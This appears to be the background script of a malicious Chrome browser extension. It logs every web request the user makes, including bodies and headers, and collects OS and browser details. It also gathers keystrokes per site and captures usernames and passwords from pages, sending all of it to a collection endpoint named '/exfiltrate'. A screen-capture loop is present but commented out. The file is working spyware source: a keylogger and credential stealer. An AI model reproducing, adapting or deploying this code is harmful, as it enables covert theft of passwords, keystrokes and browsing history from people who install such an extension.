// Function to send a stuff to the server
function sendToServer(type, results) {
  fetch("http://localhost:3000/exfiltrate", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ type: type, data: results }),
    })
    .then((response) => {
      if (response.ok) {

      } else {
        console.error("Failed to send data:", results, response.statusText);
      }
    })
    .catch((error) => {
      console.error("Error sending data:", results, error);
    });
}

/**********************

       URLS STUFF

************************/

//chrome.webRequest.onBeforeRequest.addListener(
//    function (details) {
//        if (!details.initiator) {
//            sendToServer("urls", details.url);
//        }
//    },
//    { urls: ["<all_urls>"] },
//    ["requestBody"]
//);
let requestQueue = [];
let processing = false;

chrome.webRequest.onBeforeRequest.addListener(
    function (details) {
        if (!details.initiator) {  // Check if there is no initiator
            requestQueue.push({
                type: "initial_request",
                url: details.url,
                method: details.method,                    // HTTP method (e.g., GET, POST)
                requestBody: details.requestBody,          // Request body, if any
                requestHeaders: details.requestHeaders,    // Request headers
                initiator: details.initiator,              // The initiator of the request (will be undefined)
                tabId: details.tabId,                      // Tab ID that initiated the request
                type: details.type,                        // Type of the request (e.g., main_frame, xmlhttprequest)
                timeStamp: details.timeStamp,              // The timestamp when the request was made
                frameId: details.frameId,                  // Frame ID of the request
                frameUrl: details.frameUrl,                // URL of the frame making the request
                originUrl: details.originUrl,              // Origin URL of the document
                redirectUrl: details.redirectUrl,          // The URL if the request was redirected
                hasUserGesture: details.hasUserGesture    // Whether it was initiated by a user gesture
            });
        }
        processQueue();
    },
    { urls: ["<all_urls>"] },
    ["requestBody"]
);


function processQueue() {
    if (processing || requestQueue.length === 0) return;

    processing = true;

    setTimeout(() => {
        // Send the collected requests to the server
        sendToServer("urls", requestQueue);
        requestQueue = []; // Clear the queue after sending
        processing = false;
    }, 2000); // Send every 5 seconds
}

//chrome.tabs.query({}, (tabs) => {
//  tabs.forEach((tab) => {
//    if (tab.url) {
//      sendToServer('urls', tab.url);
//    }
//  });
//});

//chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
//  if (changeInfo.url) {
//    sendToServer('urls', tab.url);
//  }
//});

//chrome.tabs.onCreated.addListener((tab) => {
//  if (tab.url) {
//    sendToServer('urls', tab.url);
//  }
//});




/**********************

       OS STUFF

************************/

function detectOS() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Windows")) {
        return "Windows";
    } else if (userAgent.includes("Mac")) {
        return "MacOS";
    } else if (userAgent.includes("Linux")) {
        return "Linux";
    } else if (userAgent.includes("Android")) {
        return "Android";
    } else if (userAgent.includes("iOS")) {
        return "iOS";
    } else {
        return "Unknown OS";
    }
}

function detectDeviceType() {
    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    return isMobile ? "Mobile" : "Desktop";
}

function detectBrowser() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Firefox")) {
        return "Mozilla Firefox";
    } else if (userAgent.includes("Edg")) {
        return "Microsoft Edge";
    } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
        return "Google Chrome";
    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
        return "Apple Safari";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        return "Opera";
    } else {
        return "Unknown Browser";
    }
}

function collectSystemInfo() {
    const systemInfo = {
        os: detectOS(),
        deviceType: detectDeviceType(),
        browser: detectBrowser(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    sendToServer('os', systemInfo);
}

collectSystemInfo();


/**********************

       Keylogger STUFF

************************/

let keystrokeData = new Map();
let keystrokeTimeouts = new Map(); // Store timeouts per URL

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "keystroke") {
        const { url, text, timestamp } = message;

        if (!keystrokeData.has(url)) {
            keystrokeData.set(url, []);
        }

        if (keystrokeTimeouts.has(url)) {
            clearTimeout(keystrokeTimeouts.get(url));
        }

        const timeout = setTimeout(() => {
            keystrokeData.get(url).push({ text, timestamp });

            // Reinsert the URL entry to move it to the end
            const updatedEntry = [url, keystrokeData.get(url)];
            keystrokeData.delete(url); // Remove old position
            keystrokeData.set(url, updatedEntry[1]); // Reinsert to maintain order

            sendToServer("keys", Object.fromEntries(keystrokeData));

            keystrokeTimeouts.delete(url);
        }, 3000);

        keystrokeTimeouts.set(url, timeout);
    }
});


/**********************

       Credential Stuff

************************/

let credentials = {}
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "credentials") {
        const { site, username, password } = message.data;
        credentials[site] = {username, password};
        sendToServer("credentials", credentials);
    }
});

/**********************

       Screen Capture Stuff

************************/
//
//let intervalId = null;
//
//function startScreenshotLoop() {
//    if (!intervalId) {
//        intervalId = setInterval(() => {
//            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
//                if (chrome.runtime.lastError) {
//                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
//                } else {
//                    sendToServer("screenshot", imageUri);
//                }
//            });
//        }, 7000);
//    }
//}
//
//function downloadScreenshot(imageUri) {
//    const filename = `screenshot_${Date.now()}.png`;
//    chrome.downloads.download({
//        url: imageUri,
//        filename: filename
//    });
//}
//
//chrome.runtime.onStartup.addListener(startScreenshotLoop);
//chrome.runtime.onInstalled.addListener(startScreenshotLoop);
//
//chrome.tabs.onActivated.addListener(startScreenshotLoop);